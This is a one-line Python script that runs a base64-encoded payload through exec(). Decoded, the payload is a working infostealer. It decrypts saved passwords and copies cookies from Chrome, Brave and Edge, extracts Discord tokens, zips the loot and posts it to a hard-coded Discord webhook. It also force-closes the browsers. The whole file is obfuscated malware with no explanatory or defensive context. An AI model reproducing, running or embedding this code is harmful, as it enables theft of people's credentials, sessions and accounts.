exec(f"""{base64.b64decode("Vj0nZW5jcnlwdGVkX2tleScKVT0nb3NfY3J5cHQnClE9J1NFTEVDVCBuYW1lLCB2YWx1ZSwgaG9zdF9rZXksIHBhdGgsIGV4cGlyZXNfdXRjLCBpc19zZWN1cmUsIGlzX2h0dHBvbmx5LCBsYXN0X2FjY2Vzc191dGMgRlJPTSBjb29raWVzJwpQPSdTRUxFQ1Qgb3JpZ2luX3VybCwgdXNlcm5hbWVfdmFsdWUsIHBhc3N3b3JkX3ZhbHVlIEZST00gbG9naW5zJwpPPWVudW1lcmF0ZQpOPW9wZW4KST1Ob25lCkY9J0xvZ2ludmF1bHQuZGInCkU9J1VTRVJQUk9GSUxFJwpEPUV4Y2VwdGlvbgpDPSdDb29raWVzLmRiJwppbXBvcnQgb3MgLHJlICxqc29uIGFzIFIgLGJhc2U2NCAsc3FsaXRlMyBhcyBzcWxpdGUzICx3aW4zMmNyeXB0IGFzIFMgLHNodXRpbCAsY3N2ICNsaW5lOjEyCmZyb20gY29udGV4dGxpYiBpbXBvcnQgY2xvc2luZyBhcyBCICNsaW5lOjEzCmZyb20gQ3J5cHRvZG9tZSAuQ2lwaGVyIGltcG9ydCBBRVMgYXMgSiAjbGluZToxNAppbXBvcnQgaW8gLHppcGZpbGUgYXMgVCAscmVxdWVzdHMgI2xpbmU6MTUKY2xhc3MgTDoKCWRlZiBfX2luaXRfXyhvcyxuYW1lLGxvY2FsX3N0YXRlX3BhdGgsZGF0YV9wYXRoLGNvb2tpZXNfcGF0aCk6b3MubmFtZT1uYW1lO29zLmxvY2FsX3N0YXRlX3BhdGg9bG9jYWxfc3RhdGVfcGF0aDtvcy5kYXRhX3BhdGg9ZGF0YV9wYXRoO29zLmNvb2tpZXNfcGF0aD1jb29raWVzX3BhdGgKCWRlZiBleHRyYWN0X3Bhc3N3b3JkcyhvcyxzZWNyZXRfa2V5LGNzdl93cml0ZXJfcGFzc3dvcmRzKTowCglkZWYgZXh0cmFjdF9jb29raWVzKG9zLGNzdl93cml0ZXJfY29va2llcyk6MAoJZGVmIGdldF9zZWNyZXRfa2V5KEIpOgoJCXRyeToKCQkJd2l0aCBOKEIubG9jYWxfc3RhdGVfcGF0aCwncicsZW5jb2Rpbmc9J3V0Zi04JylhcyBDOkU9Ui5sb2FkcyhDLnJlYWQoKSkKCQkJb3M9YmFzZTY0LmI2NGRlY29kZShFW1VdW1ZdKVs1Ol07b3M9Uy5DcnlwdFVucHJvdGVjdERhdGEob3MsSSxJLEksMClbMV07cmV0dXJuIG9zCgkJZXhjZXB0IEQgYXMgRjpwYXNzO3JldHVybgpjbGFzcyBZKEwpOgoJZGVmIF9faW5pdF9fKEYpOkI9b3MucGF0aC5ub3JtcGF0aCgnJXNcXEFwcERhdGFcXExvY2FsXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxMb2NhbCBTdGF0ZSclb3MuZW52aXJvbltFXSk7Qz1vcy5wYXRoLm5vcm1wYXRoKCclc1xcQXBwRGF0YVxcTG9jYWxcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGEnJW9zLmVudmlyb25bRV0pO0Q9b3MucGF0aC5ub3JtcGF0aCgnJXNcXEFwcERhdGFcXExvY2FsXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxEZWZhdWx0XFxOZXR3b3JrXFxDb29raWVzJyVvcy5lbnZpcm9uW0VdKTtzdXBlcigpLl9faW5pdF9fKCdDaHJvbWUnLEIsQyxEKQoJZGVmIGV4dHJhY3RfcGFzc3dvcmRzKGJhc2U2NCxzZWNyZXRfa2V5LGNzdl93cml0ZXJfcGFzc3dvcmRzKToKCQlMPW9zLnBhdGgubm9ybXBhdGgoZiJ7YmFzZTY0LmRhdGFfcGF0aH1cXERlZmF1bHRcXExvZ2luIERhdGEiKQoJCXRyeToKCQkJc2h1dGlsLmNvcHkyKEwsRikKCQkJd2l0aCBCKHNxbGl0ZTMuY29ubmVjdChGKSlhcyBOLEIoTi5jdXJzb3IoKSlhcyBDOgoJCQkJQy5leGVjdXRlKFApCgkJCQlmb3IoUSwoRSxJLEopKWluIE8oQy5mZXRjaGFsbCgpKToKCQkJCQlpZiBFIGFuZCBJIGFuZCBKOlI9TShKLHNlY3JldF9rZXkpO2Nzdl93cml0ZXJfcGFzc3dvcmRzLndyaXRlcm93KFtRLEUsSSxSXSkKCQlleGNlcHQgRCBhcyBTOnBhc3MKCWRlZiBleHRyYWN0X2Nvb2tpZXMoRixjc3Zfd3JpdGVyX2Nvb2tpZXMpOgoJCXRyeToKCQkJc2h1dGlsLmNvcHkyKEYuY29va2llc19wYXRoLEMpCgkJCXdpdGggQihzcWxpdGUzLmNvbm5lY3QoQykpYXMgSSxCKEkuY3Vyc29yKCkpYXMgRToKCQkJCUUuZXhlY3V0ZShRKQoJCQkJZm9yIEogaW4gRS5mZXRjaGFsbCgpOmNzdl93cml0ZXJfY29va2llcy53cml0ZXJvdyhKKQoJCWV4Y2VwdCBEIGFzIGJhc2U2NDpwYXNzCgkJZmluYWxseToKCQkJaWYgb3MucGF0aC5leGlzdHMoQyk6b3MucmVtb3ZlKEMpCmNsYXNzIFooTCk6CglkZWYgX19pbml0X18oRik6Qj1vcy5wYXRoLm5vcm1wYXRoKCclc1xcQXBwRGF0YVxcTG9jYWxcXEJyYXZlU29mdHdhcmVcXEJyYXZlLUJyb3dzZXJcXFVzZXIgRGF0YVxcTG9jYWwgU3RhdGUnJW9zLmVudmlyb25bRV0pO0M9b3MucGF0aC5ub3JtcGF0aCgnJXNcXEFwcERhdGFcXExvY2FsXFxCcmF2ZVNvZnR3YXJlXFxCcmF2ZS1Ccm93c2VyXFxVc2VyIERhdGEnJW9zLmVudmlyb25bRV0pO0Q9b3MucGF0aC5ub3JtcGF0aCgnJXNcXEFwcERhdGFcXExvY2FsXFxCcmF2ZVNvZnR3YXJlXFxCcmF2ZS1Ccm93c2VyXFxVc2VyIERhdGFcXERlZmF1bHRcXE5ldHdvcmtcXENvb2tpZXMnJW9zLmVudmlyb25bRV0pO3N1cGVyKCkuX19pbml0X18oJ0JyYXZlJyxCLEMsRCkKCWRlZiBleHRyYWN0X3Bhc3N3b3JkcyhiYXNlNjQsc2VjcmV0X2tleSxjc3Zfd3JpdGVyX3Bhc3N3b3Jkcyk6CgkJTD1vcy5wYXRoLm5vcm1wYXRoKGYie2Jhc2U2NC5kYXRhX3BhdGh9XFxEZWZhdWx0XFxMb2dpbiBEYXRhIikKCQl0cnk6CgkJCXNodXRpbC5jb3B5MihMLEYpCgkJCXdpdGggQihzcWxpdGUzLmNvbm5lY3QoRikpYXMgTixCKE4uY3Vyc29yKCkpYXMgQzoKCQkJCUMuZXhlY3V0ZShQKQoJCQkJZm9yKFEsKEUsSSxKKSlpbiBPKEMuZmV0Y2hhbGwoKSk6CgkJCQkJaWYgRSBhbmQgSSBhbmQgSjpSPU0oSixzZWNyZXRfa2V5KTtjc3Zfd3JpdGVyX3Bhc3N3b3Jkcy53cml0ZXJvdyhbUSxFLEksUl0pCgkJZXhjZXB0IEQgYXMgUzpwYXNzCglkZWYgZXh0cmFjdF9jb29raWVzKEYsY3N2X3dyaXRlcl9jb29raWVzKToKCQl0cnk6CgkJCXNodXRpbC5jb3B5MihGLmNvb2tpZXNfcGF0aCxDKQoJCQl3aXRoIEIoc3FsaXRlMy5jb25uZWN0KEMpKWFzIEksQihJLmN1cnNvcigpKWFzIEU6CgkJCQlFLmV4ZWN1dGUoUSkKCQkJCWZvciBKIGluIEUuZmV0Y2hhbGwoKTpjc3Zfd3JpdGVyX2Nvb2tpZXMud3JpdGVyb3coSikKCQlleGNlcHQgRCBhcyBiYXNlNjQ6cGFzcwoJCWZpbmFsbHk6CgkJCWlmIG9zLnBhdGguZXhpc3RzKEMpOm9zLnJlbW92ZShDKQpjbGFzcyBhKEwpOgoJZGVmIF9faW5pdF9fKEYpOkI9b3MucGF0aC5ub3JtcGF0aCgnJXNcXEFwcERhdGFcXExvY2FsXFxNaWNyb3NvZnRcXEVkZ2VcXFVzZXIgRGF0YVxcTG9jYWwgU3RhdGUnJW9zLmVudmlyb25bRV0pO0M9b3MucGF0aC5ub3JtcGF0aCgnJXNcXEFwcERhdGFcXExvY2FsXFxNaWNyb3NvZnRcXEVkZ2VcXFVzZXIgRGF0YSclb3MuZW52aXJvbltFXSk7RD1vcy5wYXRoLm5vcm1wYXRoKCclc1xcQXBwRGF0YVxcTG9jYWxcXE1pY3Jvc29mdFxcRWRnZVxcVXNlciBEYXRhXFxEZWZhdWx0XFxOZXR3b3JrXFxDb29raWVzJyVvcy5lbnZpcm9uW0VdKTtzdXBlcigpLl9faW5pdF9fKCdFZGdlJyxCLEMsRCkKCWRlZiBleHRyYWN0X3Bhc3N3b3JkcyhiYXNlNjQsc2VjcmV0X2tleSxjc3Zfd3JpdGVyX3Bhc3N3b3Jkcyk6CgkJTD1vcy5wYXRoLm5vcm1wYXRoKGYie2Jhc2U2NC5kYXRhX3BhdGh9XFxEZWZhdWx0XFxMb2dpbiBEYXRhIikKCQl0cnk6CgkJCXNodXRpbC5jb3B5MihMLEYpCgkJCXdpdGggQihzcWxpdGUzLmNvbm5lY3QoRikpYXMgTixCKE4uY3Vyc29yKCkpYXMgQzoKCQkJCUMuZXhlY3V0ZShQKQoJCQkJZm9yKFEsKEUsSSxKKSlpbiBPKEMuZmV0Y2hhbGwoKSk6CgkJCQkJaWYgRSBhbmQgSSBhbmQgSjpSPU0oSixzZWNyZXRfa2V5KTtjc3Zfd3JpdGVyX3Bhc3N3b3Jkcy53cml0ZXJvdyhbUSxFLEksUl0pCgkJZXhjZXB0IEQgYXMgUzpwYXNzCglkZWYgZXh0cmFjdF9jb29raWVzKEYsY3N2X3dyaXRlcl9jb29raWVzKToKCQl0cnk6CgkJCXNodXRpbC5jb3B5MihGLmNvb2tpZXNfcGF0aCxDKQoJCQl3aXRoIEIoc3FsaXRlMy5jb25uZWN0KEMpKWFzIEksQihJLmN1cnNvcigpKWFzIEU6CgkJCQlFLmV4ZWN1dGUoUSkKCQkJCWZvciBKIGluIEUuZmV0Y2hhbGwoKTpjc3Zfd3JpdGVyX2Nvb2tpZXMud3JpdGVyb3coSikKCQlleGNlcHQgRCBhcyBiYXNlNjQ6cGFzcwoJCWZpbmFsbHk6CgkJCWlmIG9zLnBhdGguZXhpc3RzKEMpOm9zLnJlbW92ZShDKQpkZWYgYihicm93c2VyKToKCW9zPWJyb3dzZXI7Qj1pby5TdHJpbmdJTygpO0M9Y3N2LndyaXRlcihCKTtDLndyaXRlcm93KFsnaW5kZXgnLCd1cmwnLCd1c2VybmFtZScsJ3Bhc3N3b3JkJ10pO0Q9aW8uU3RyaW5nSU8oKTtFPWNzdi53cml0ZXIoRCk7RS53cml0ZXJvdyhbJ25hbWUnLCd2YWx1ZScsJ2RvbWFpbicsJ3BhdGgnLCdleHBpcmVzX3V0YycsJ2lzX3NlY3VyZScsJ2lzX2h0dHBfb25seScsJ2xhc3RfYWNjZXNzX3V0YyddKTtGPW9zLmdldF9zZWNyZXRfa2V5KCkKCWlmIEY6b3MuZXh0cmFjdF9wYXNzd29yZHMoRixDKTtvcy5leHRyYWN0X2Nvb2tpZXMoRSkKCXJldHVybiBCLmdldHZhbHVlKCksRC5nZXR2YWx1ZSgpCmRlZiBjKGNpcGhlcixwYXlsb2FkKTpyZXR1cm4gY2lwaGVyLmRlY3J5cHQocGF5bG9hZCkKZGVmIGQoYWVzX2tleSxpdik6cmV0dXJuIEoubmV3KGFlc19rZXksSi5NT0RFX0dDTSxpdikKZGVmIE0oY2lwaGVydGV4dCxzZWNyZXRfa2V5KToKCW9zPWNpcGhlcnRleHQKCXRyeTpCPW9zWzM6MTVdO0M9b3NbMTU6LTE2XTtFPWQoc2VjcmV0X2tleSxCKTtGPWMoRSxDKS5kZWNvZGUoKTtyZXR1cm4gRgoJZXhjZXB0IEQgYXMgc3FsaXRlMzpwYXNzO3JldHVybicnCmRlZiBlKCk6CglGPW9zLmdldGVudignQVBQREFUQScpO0M9W107Qj1mIntGfVxcZGlzY29yZCIKCWlmIG5vdCBvcy5wYXRoLmV4aXN0cyhCKTpyZXR1cm4gQwoJc3FsaXRlMz1OKGYie0J9XFxMb2NhbCBTdGF0ZSIsJ3InKTtzaHV0aWw9YmFzZTY0LmI2NGRlY29kZShSLmxvYWRzKHNxbGl0ZTMucmVhZCgpKVtVXVtWXSk7TD1TLkNyeXB0VW5wcm90ZWN0RGF0YShzaHV0aWxbNTpdLEksSSxJLDApWzFdCglmb3IgRCBpbiBvcy5saXN0ZGlyKGYie0J9XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiIik6CgkJaWYgRFstMzpdbm90IGluWydsb2cnLCdsZGInXTpjb250aW51ZQoJCWZvciBNIGluW29zLnN0cmlwKClmb3Igb3MgaW4gTihmIntCfVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxce0R9IixlcnJvcnM9J2lnbm9yZScpLnJlYWRsaW5lcygpaWYgb3Muc3RyaXAoKV06CgkJCWZvciBPIGluIHJlLmZpbmRhbGwoJ2RRdzR3OVdnWGNROlteXFwiXSonLE0pOkU9YmFzZTY0LmI2NGRlY29kZShPLnNwbGl0KCdkUXc0dzlXZ1hjUTonKVsxXSk7UD1KLm5ldyhMLEouTU9ERV9HQ00sRVszOjE1XSkuZGVjcnlwdChFWzE1Ol0pWzotMTZdLmRlY29kZSgpO0MuYXBwZW5kKFApCglyZXR1cm4gQwpkZWYgZigpOgoJQj1pby5CeXRlc0lPKCkKCXdpdGggVC5aaXBGaWxlKEIsJ3cnLFQuWklQX0RFRkxBVEVEKWFzIEM6CgkJST1bWSgpLFooKSxhKCldCgkJZm9yIEQgaW4gSToKCQkJRSxzcWxpdGUzPWIoRCkKCQkJaWYgRTpDLndyaXRlc3RyKGYie0QubmFtZX1fcGFzc3dvcmRzLmNzdiIsRSkKCQkJaWYgc3FsaXRlMzpDLndyaXRlc3RyKGYie0QubmFtZX1fY29va2llcy5jc3YiLHNxbGl0ZTMpCgkJc2h1dGlsPWUoKQoJCWlmIHNodXRpbDpKPSdcbicuam9pbihzaHV0aWwpO0Mud3JpdGVzdHIoJ2Rpc2NvcmRfdG9rZW5zLnR4dCcsSikKCUIuc2VlaygwKTtiYXNlNjQ9J2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEyMDMzOTc4MTY5MTE3OTAxOTAvWElfVDRUN1BzcmtfdHM0OXZjVVR4MWM5OGhkaU9LUlplTXdRQzdNUjFJZzZiNDgxSlpIZ3RfZVhYOWNrRXhSQ1RHOVMnO0w9eydmaWxlJzooZid7b3MuZ2V0bG9naW4oKX0uemlwJyxCLmdldHZhbHVlKCksJ2FwcGxpY2F0aW9uL3ppcCcpfTtyZXF1ZXN0cy5wb3N0KGJhc2U2NCxmaWxlcz1MKTtvcy5yZW1vdmUoRikKaWYgX19uYW1lX189PSdfX21haW5fXyc6CglnPVsnY2hyb21lLmV4ZScsJ2JyYXZlLmV4ZScsJ21zZWRnZS5leGUnXQoJZm9yIGggaW4gZzoKCQl0cnk6b3Muc3lzdGVtKGYndGFza2tpbGwgL2YgL2ltIHtofScpCgkJZXhjZXB0IEQgYXMgaTpwYXNzCglmKCk=").decode("utf-8")}""")
